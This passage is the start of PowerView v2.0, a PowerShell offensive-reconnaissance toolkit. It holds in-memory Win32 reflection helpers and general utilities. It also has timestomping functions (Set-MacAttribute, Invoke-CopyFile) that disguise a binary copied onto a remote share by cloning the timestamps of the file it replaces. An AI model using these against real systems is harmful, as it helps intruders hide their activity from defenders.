#requires -version 2

<#
PowerView v2.0

See README.md for more information.

by @harmj0y
#>



########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

function New-InMemoryModule
{
<#
.SYNOPSIS

Creates an in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

$Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = [AppDomain]::CurrentDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
.SYNOPSIS

Creates a .NET type for an unmanaged Win32 function.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func

.DESCRIPTION

Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).

The 'func' helper function can be used to reduce typing when defining
multiple function definitions.

.PARAMETER DllName

The name of the DLL.

.PARAMETER FunctionName

The name of the target function.

.PARAMETER ReturnType

The return type of the function.

.PARAMETER ParameterTypes

The function parameters.

.PARAMETER NativeCallingConvention

Specifies the native calling convention of the function. Defaults to
stdcall.

.PARAMETER Charset

If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.

.PARAMETER SetLastError

Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.

.PARAMETER Module

The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER Namespace

An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

.NOTES

Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum
{
<#
.SYNOPSIS

Creates an in-memory enumeration for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION

The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.

.PARAMETER Module

The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the enum.

.PARAMETER Type

The type of each enum element.

.PARAMETER EnumElements

A hashtable of enum elements.

.PARAMETER Bitfield

Specifies that the enum should be treated as a bitfield.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field

.DESCRIPTION

The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 'field' helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}


########################################################
#
# Misc. helpers
#
########################################################

function Get-ShuffledArray {
    <#
        .SYNOPSIS
        Returns a randomly-shuffled version of a passed array.

        .DESCRIPTION
        This function takes an array and returns a randomly-shuffled
        version.

        .PARAMETER Array
        The passed array to shuffle.

        .OUTPUTS
        System.Array. The passed array but shuffled.

        .EXAMPLE
        > $shuffled = Get-ShuffledArray $array
        Get a shuffled version of $array.

        .LINK
        http://sqlchow.wordpress.com/2013/03/04/shuffle-the-deck-using-powershell/
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [Array]$Array
    )
    Begin{}
    Process{
        $len = $Array.Length
        while($len){
            $i = Get-Random ($len --)
            $tmp = $Array[$len]
            $Array[$len] = $Array[$i]
            $Array[$i] = $tmp
        }
        $Array;
    }
}


function Invoke-CheckWrite {
    <#
        .SYNOPSIS
        Check if the current user has write access to a given file.

        .DESCRIPTION
        This function tries to open a given file for writing and then
        immediately closes it, returning true if the file successfully
        opened, and false if it failed.

        .PARAMETER Path
        Path of the file to check for write access.

        .OUTPUTS
        System.bool. True if the add succeeded, false otherwise.

        .EXAMPLE
        > Invoke-CheckWrite "test.txt"
        Check if the current user has write access to "test.txt"
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $Path
    )
    Begin{}

    Process{
        try {
            $filetest = [IO.FILE]::OpenWrite($Path)
            $filetest.close()
            $true
        }
        catch {
            Write-Verbose -Message $Error[0]
            $false
        }
    }

    End{}
}


# stolen directly from http://poshcode.org/1590
<#
  This Export-CSV behaves exactly like native Export-CSV
  However it has one optional switch -Append
  Which lets you append new data to existing CSV file: e.g.
  Get-Process | Select ProcessName, CPU | Export-CSV processes.csv -Append

  For details, see
  http://dmitrysotnikov.wordpress.com/2010/01/19/export-csv-append/

  (c) Dmitry Sotnikov
#>
function Export-CSV {
    [CmdletBinding(DefaultParameterSetName='Delimiter',
            SupportsShouldProcess=$true,
    ConfirmImpact='Medium')]
    Param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true,
        ValueFromPipelineByPropertyName=$true)]
        [System.Management.Automation.PSObject]
        $InputObject,

        [Parameter(Mandatory=$true, Position=0)]
        [Alias('PSPath')]
        [System.String]
        $Path,

        #region -Append (added by Dmitry Sotnikov)
        [Switch]
        $Append,
        #endregion

        [Switch]
        $Force,

        [Switch]
        $NoClobber,

        [ValidateSet('Unicode','UTF7','UTF8','ASCII','UTF32','BigEndianUnicode','Default','OEM')]
        [System.String]
        $Encoding,

        [Parameter(ParameterSetName='Delimiter', Position=1)]
        [ValidateNotNull()]
        [System.Char]
        $Delimiter,

        [Parameter(ParameterSetName='UseCulture')]
        [Switch]
        $UseCulture,

        [Alias('NTI')]
        [Switch]
        $NoTypeInformation
    )

    Begin
    {
        # This variable will tell us whether we actually need to append
        # to existing file
        $AppendMode = $false

        try {
            $outBuffer = $null
            if ($PSBoundParameters.TryGetValue('OutBuffer', [ref]$outBuffer))
            {
                $PSBoundParameters['OutBuffer'] = 1
            }
            $wrappedCmd = $ExecutionContext.InvokeCommand.GetCommand('Export-Csv',
            [System.Management.Automation.CommandTypes]::Cmdlet)


            #String variable to become the target command line
            $scriptCmdPipeline = ''

            # Add new parameter handling
            #region Dmitry: Process and remove the Append parameter if it is present
            if ($Append) {

                $PSBoundParameters.Remove('Append') | Out-Null

                if ($Path) {
                    if (Test-Path -Path $Path) {
                        # Need to construct new command line
                        $AppendMode = $true

                        if ($Encoding.Length -eq 0) {
                            # ASCII is default encoding for Export-CSV
                            $Encoding = 'ASCII'
                        }

                        # For Append we use ConvertTo-CSV instead of Export
                        $scriptCmdPipeline += 'ConvertTo-Csv -NoTypeInformation '

                        # Inherit other CSV convertion parameters
                        if ( $UseCulture ) {
                            $scriptCmdPipeline += ' -UseCulture '
                        }

                        if ( $Delimiter ) {
                            $scriptCmdPipeline += " -Delimiter '$Delimiter' "
                        }

                        # Skip the first line (the one with the property names)
                        $scriptCmdPipeline += ' | Foreach-Object {$start=$true}'
                        $scriptCmdPipeline += '{if ($start) {$start=$false} else {$_}} '

                        # Add file output
                        $scriptCmdPipeline += " | Out-File -FilePath '$Path' -Encoding '$Encoding' -Append "

                        if ($Force) {
                            $scriptCmdPipeline += ' -Force'
                        }

                        if ($NoClobber) {
                            $scriptCmdPipeline += ' -NoClobber'
                        }
                    }
                }
            }
            $scriptCmd = {& $wrappedCmd @PSBoundParameters }

            if ( $AppendMode ) {
                # redefine command line
                $scriptCmd = $ExecutionContext.InvokeCommand.NewScriptBlock(
                    $scriptCmdPipeline
                )
            } else {
                # execute Export-CSV as we got it because
                # either -Append is missing or file does not exist
                $scriptCmd = $ExecutionContext.InvokeCommand.NewScriptBlock(
                    [String]$scriptCmd
                )
            }

            # standard pipeline initialization
            $steppablePipeline = $scriptCmd.GetSteppablePipeline($myInvocation.CommandOrigin)
            $steppablePipeline.Begin($PSCmdlet)

        }
        catch {
            throw
        }
    }

    process
    {
        try {
            $steppablePipeline.Process($_)
        } catch {
            throw
        }
    }

    end
    {
        try {
            $steppablePipeline.End()
        } catch {
            throw
        }
    }
<#

.ForwardHelpTargetName Export-Csv
.ForwardHelpCategory Cmdlet

#>

}


# from  https://gist.github.com/mdnmdn/6936714
function Get-EscapedJSONString($str){
    if ($str -eq $null) {return ""}
    $str = $str.ToString().Replace('"','\"').Replace('\','\\').Replace("`n",'\n').Replace("`r",'\r').Replace("`t",'\t')
    return $str;
}

function ConvertTo-JSON($maxDepth = 4,$forceArray = $false) {
    begin {
        $data = @()
    }
    process{
        $data += $_
    }
    
    end{
    
        if ($data.length -eq 1 -and $forceArray -eq $false) {
            $value = $data[0]
        } else {    
            $value = $data
        }

        if ($value -eq $null) {
            return "null"
        }

        $dataType = $value.GetType().Name
        
        switch -regex ($dataType) {
                'String'  {
                    return  "`"{0}`"" -f (Get-EscapedJSONString $value )
                }
                '(System\.)?DateTime'  {return  "`"{0:yyyy-MM-dd}T{0:HH:mm:ss}`"" -f $value}
                'Int32|Double' {return  "$value"}
                'Boolean' {return  "$value".ToLower()}
                '(System\.)?Object\[\]' { # array
                    
                    if ($maxDepth -le 0){return "`"$value`""}
                    
                    $jsonResult = ''
                    foreach($elem in $value){
                        #if ($elem -eq $null) {continue}
                        if ($jsonResult.Length -gt 0) {$jsonResult +=', '}              
                        $jsonResult += ($elem | ConvertTo-JSON -maxDepth ($maxDepth -1))
                    }
                    return "[" + $jsonResult + "]"
                }
                '(System\.)?Hashtable' { # hashtable
                    $jsonResult = ''
                    foreach($key in $value.Keys){
                        if ($jsonResult.Length -gt 0) {$jsonResult +=', '}
                        $jsonResult += 
@"
    "{0}": {1}
"@ -f $key , ($value[$key] | ConvertTo-JSON -maxDepth ($maxDepth -1) )
                    }
                    return "{" + $jsonResult + "}"
                }
                default { #object
                    if ($maxDepth -le 0){return  "`"{0}`"" -f (Get-EscapedJSONString $value)}
                    
                    return "{" +
                        (($value | Get-Member -MemberType *property | % { 
@"
    "{0}": {1}
"@ -f $_.Name , ($value.($_.Name) | ConvertTo-JSON -maxDepth ($maxDepth -1) )           
                    
                    }) -join ', ') + "}"
                }
        }
    }
}


# stolen directly from http://obscuresecurity.blogspot.com/2014/05/touch.html
function Set-MacAttribute {
<#
    .SYNOPSIS

        Sets the modified, accessed and created (Mac) attributes for a file based on another file or input.

        PowerSploit Function: Set-MacAttribute
        Author: Chris Campbell (@obscuresec)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
        Version: 1.0.0

    .DESCRIPTION

        Set-MacAttribute sets one or more Mac attributes and returns the new attribute values of the file.

    .EXAMPLE

        PS C:\> Set-MacAttribute -FilePath c:\test\newfile -OldFilePath c:\test\oldfile

    .EXAMPLE

        PS C:\> Set-MacAttribute -FilePath c:\demo\test.xt -All "01/03/2006 12:12 pm"

    .EXAMPLE

        PS C:\> Set-MacAttribute -FilePath c:\demo\test.txt -Modified "01/03/2006 12:12 pm" -Accessed "01/03/2006 12:11 pm" -Created "01/03/2006 12:10 pm"

    .LINK

        http://www.obscuresec.com/2014/05/touch.html
#>
    [CmdletBinding(DefaultParameterSetName = 'Touch')]
    Param (

        [Parameter(Position = 1,Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FilePath,

        [Parameter(ParameterSetName = 'Touch')]
        [ValidateNotNullOrEmpty()]
        [String]
        $OldFilePath,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Modified,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Accessed,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Created,

        [Parameter(ParameterSetName = 'All')]
        [DateTime]
        $AllMacAttributes
    )

    #Helper function that returns an object with the MAC attributes of a file.
    function Get-MacAttribute {

        param($OldFileName)

        if (!(Test-Path -Path $OldFileName)){Throw 'File Not Found'}
        $FileInfoObject = (Get-Item $OldFileName)

        $ObjectProperties = @{'Modified' = ($FileInfoObject.LastWriteTime);
                              'Accessed' = ($FileInfoObject.LastAccessTime);
                              'Created' = ($FileInfoObject.CreationTime)};
        $ResultObject = New-Object -TypeName PSObject -Property $ObjectProperties
        Return $ResultObject
    }

    #test and set variables
    if (!(Test-Path -Path $FilePath)){Throw "$FilePath not found"}

    $FileInfoObject = (Get-Item -Path $FilePath)

    if ($PSBoundParameters['AllMacAttributes']){
        $Modified = $AllMacAttributes
        $Accessed = $AllMacAttributes
        $Created = $AllMacAttributes
    }

    if ($PSBoundParameters['OldFilePath']){

        if (!(Test-Path -Path $OldFilePath)){Write-Error "$OldFilePath not found."}

        $CopyFileMac = (Get-MacAttribute $OldFilePath)
        $Modified = $CopyFileMac.Modified
        $Accessed = $CopyFileMac.Accessed
        $Created = $CopyFileMac.Created
    }

    if ($Modified) {$FileInfoObject.LastWriteTime = $Modified}
    if ($Accessed) {$FileInfoObject.LastAccessTime = $Accessed}
    if ($Created) {$FileInfoObject.CreationTime = $Created}

    Return (Get-MacAttribute $FilePath)
}


function Invoke-CopyFile {
    <#
        .SYNOPSIS
        Copy a source file to a destination location, matching any MAC
        properties as appropriate.

        .PARAMETER SourceFile
        Source file to copy.

        .PARAMETER DestFile
        Destination file path to copy file to.

        .EXAMPLE
        > Invoke-CopyFile -SourceFile program.exe -DestFile \\WINDOWS7\tools\program.exe
        Copy the local program.exe binary to a remote location,
        matching the MAC properties of the remote exe.

        .LINK
        http://obscuresecurity.blogspot.com/2014/05/touch.html
    #>

    param(
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $SourceFile,

        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DestFile
    )

    # clone the MAC properties
    Set-MacAttribute -FilePath $SourceFile -OldFilePath $DestFile

    # copy the file off
    Copy-Item -Path $SourceFile -Destination $DestFile
}


function Get-HostIP {
    <#
    .SYNOPSIS
    Takes a hostname and resolves it an IP.

    .DESCRIPTION
    This function resolves a given hostename to its associated IPv4
    address. If no hostname is provided, it defaults to returning
    the IP address of the local host the script be being run on.

    .OUTPUTS
    System.String. The IPv4 address.

    .EXAMPLE
    > Get-HostIP -hostname SERVER
    Return the IPv4 address of 'SERVER'
    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$true)]
        [String]
        $hostname = ''
    )
    process {
        try{
            # get the IP resolution of this specified hostname
            $results = @(([net.dns]::GetHostEntry($hostname)).AddressList)

            if ($results.Count -ne 0){
                foreach ($result in $results) {
                    # make sure the returned result is IPv4
                    if ($result.AddressFamily -eq 'InterNetwork') {
                        $result.IPAddressToString
                    }
                }
            }
        }
        catch{
            Write-Verbose -Message 'Could not resolve host to an IP Address.'
        }
    }
    end {}
}


# adapted from RamblingCookieMonster's code at
# https://github.com/RamblingCookieMonster/PowerShell/blob/master/Invoke-Ping.ps1
function Invoke-Ping {
<#
.SYNOPSIS
    Ping systems in parallel
    Author: RamblingCookieMonster
    
.PARAMETER ComputerName
    One or more computers to test

.PARAMETER Timeout
    Time in seconds before we attempt to dispose an individual query.  Default is 20

.PARAMETER Throttle
    Throttle query to this many parallel runspaces.  Default is 100.

.PARAMETER NoCloseOnTimeout
